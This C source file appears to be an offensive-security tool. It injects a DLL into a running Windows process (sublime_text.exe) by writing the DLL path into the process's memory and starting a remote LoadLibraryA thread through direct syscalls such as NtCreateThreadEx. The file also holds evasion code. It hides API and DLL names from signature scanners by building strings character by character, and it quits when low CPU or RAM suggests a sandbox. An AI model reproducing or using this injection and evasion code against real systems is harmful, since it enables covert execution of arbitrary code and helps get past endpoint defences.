#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <stdio.h>
#include "Syscalls.h"
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")


BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
	// Basic anti pattern-matching detection (do not store strings in rdata section)
	wchar_t w_ntdll_str[] = { 'n','t','d','l','l','.','d','l','l',0 }; // ntdll.dll

	pWinVerInfo->hTargetPID = NULL;

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation10;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
		NtFreeVirtualMemory = &NtFreeVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation7SP1;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory7SP1;
		NtFreeVirtualMemory = &NtFreeVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation80;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory80;
		NtFreeVirtualMemory = &NtFreeVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation81;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
		NtFreeVirtualMemory = &NtFreeVirtualMemory81;
	}
	else {
		return FALSE;
	}

	ULONG uReturnLength = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
	if (!status == 0xc0000004) {
		return FALSE;
	}

	LPVOID pBuffer = NULL;
	SIZE_T uSize = uReturnLength;
	status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
	if (status != 0) {
		return FALSE;
	}

	status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
	if (status != 0) {
		return FALSE;
	}

	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)
		GetProcAddress(GetModuleHandle(w_ntdll_str), "RtlEqualUnicodeString");
	if (RtlEqualUnicodeString == NULL) {
		return FALSE;
	}

	PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
	do {
		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &pWinVerInfo->ProcName, TRUE)) {
			pWinVerInfo->hTargetPID = pProcInfo->ProcessId;
			break;
		}
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

	} while (pProcInfo);

	status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);

	if (pWinVerInfo->hTargetPID == NULL) {
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {

	// 64 bits target without CFG protection
	LPCWSTR lpwProcName = L"sublime_text.exe";
	LPCSTR DllPath = "C:\\Temp\\testlib64.dll";

	// Basic anti pattern-matching detection (do not store strings in rdata section)
	char loadlib_str[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 }; // LoadLibraryA	
	char kernel32_str[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0 }; // Kernel32.dll
	wchar_t w_ntdll_str[] = { 'n','t','d','l','l','.','d','l','l',0 }; // ntdll.dll

	if (sizeof(LPVOID) != 8) {
		//wprintf(L"[!] Sorry, this tool only works on a x64 version of Windows.\n");
		return FALSE;
	}

	// Basic virtualized environment detection (generally, low CPU, RAM...)

	// Check CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2) return FALSE;

	// Check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048) return FALSE;

	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));

	// First set OS Version/Architecture specific values
	OSVERSIONINFOEXW osInfo;
	LPWSTR lpOSVersion;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(w_ntdll_str), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		return FALSE;
	}

	//wprintf(L"[1] Checking OS version details:\n");
	RtlGetVersion(&osInfo);
	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;

	// Now create os/build specific syscall function pointers.
	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		lpOSVersion = L"10 or Server 2016";
		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		//wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess10;
		NtCreateFile = &NtCreateFile10;
		ZwClose = &ZwClose10;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
		NtFreeVirtualMemory = &NtFreeVirtualMemory10;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
		NtCreateThreadEx = &NtCreateThreadEx10;

		pWinVerInfo->SystemCall = 0x3F;
	}

	//wprintf(L"[2] Checking Process details:\n");

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(w_ntdll_str), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);

	if (!GetPID(pWinVerInfo)) {
		//wprintf(L"	[!] Enumerating process failed.\n");
		return FALSE;
	}

	//wprintf(L"	[+] Process ID of %wZ is: %lld\n", pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);

	//wprintf(L"	[+] Open a process handle.\n");
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = pWinVerInfo->hTargetPID;
	uPid.UniqueThread = (HANDLE)0;

	NTSTATUS status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
	if (hProcess == NULL) {
		//wprintf(L"	[!] Failed to get processhandle.\n");
		return FALSE;
	}
	
	// Allocate memory in target process
	//wprintf(L"	[+] Allocate memory in target process.\n");

	LPVOID pBuffer = NULL;
	ULONG uReturnLength = strlen(DllPath) + 1;
	SIZE_T uSize = uReturnLength;
	status = NtAllocateVirtualMemory(hProcess, &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
	if (status != 0) {
		//wprintf(L"	[!] Failed to get allocate memory in target process.\n");
		return FALSE;
	}

	// Write the path to the address of the memory we just allocated in the target process
	//wprintf(L"	[+] Write DLL path in memory target process.\n");

	status = ZwWriteVirtualMemory(hProcess, pBuffer, (PVOID)DllPath, strlen(DllPath) + 1, NULL);
	if (status != STATUS_SUCCESS) {
		//wprintf(L"	[!] Failed to write DLL path in memory target process.\n");
		return FALSE;
	}
	
	//wprintf(L"	[+] Create a Remote Thread in the target process.\n");
	//wprintf(L"	[+] Which calls LoadLibraryA as our dllpath as an argument -> program loads our dll.\n");
	
	// Get address of LoadLibraryA from kernel32.dll	

	LPTHREAD_START_ROUTINE pfnThreadRtn = NULL;

	// Standard way
	//pfnThreadRtn = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
	
	// Standard way with no static string
	pfnThreadRtn = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(kernel32_str), loadlib_str);

	// Manually load the dll
	/*
	HANDLE dllFile = CreateFileW(L"C:\\Windows\\System32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dllFileSize = GetFileSize(dllFile, NULL);
	HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
	CloseHandle(dllFile);

	// Analyze the dll
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);

	// Find the original function code
	PVOID pNtOriginal = NULL;
	for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
	{
		PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
		if (!strcmp(pFunctionName, "LoadLibraryA"))
		{
			pNtOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
			break;
		}
	}
	pfnThreadRtn = pNtOriginal;
	*/

	if (pfnThreadRtn == NULL) {
		//wprintf(L"	[!] Failed to get address of LoadLibraryA.\n");
		return FALSE;
	}

	// CreateRemoteThread using undocumented NtCreateThreadEx direct syscall 
	//wprintf(L"	[+] Create a Remote Thread using NtCreateThreadEx direct syscall.\n");

	HANDLE hRemoteThread = NULL;

	status = NtCreateThreadEx(
		&hRemoteThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		pfnThreadRtn,
		(LPVOID)pBuffer,
		FALSE,
		NULL,
		NULL,
		NULL,
		NULL
	);
	
	if (status != STATUS_SUCCESS) {
		//wprintf(L"	[!] Failed to create remote thread in the target process %d.\n", status);
		return FALSE;
	}

	// Wait for the execution of our loader thread to finish
	//WaitForSingleObject(hRemoteThread, INFINITE);
	
	// Free the memory allocated for our dll path
	//wprintf(L"	[+] Free memory in target process.\n");
	status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);
	
	//wprintf(L"	[+] Close process handle.\n");
	ZwClose(hProcess);
	
	return 0;
}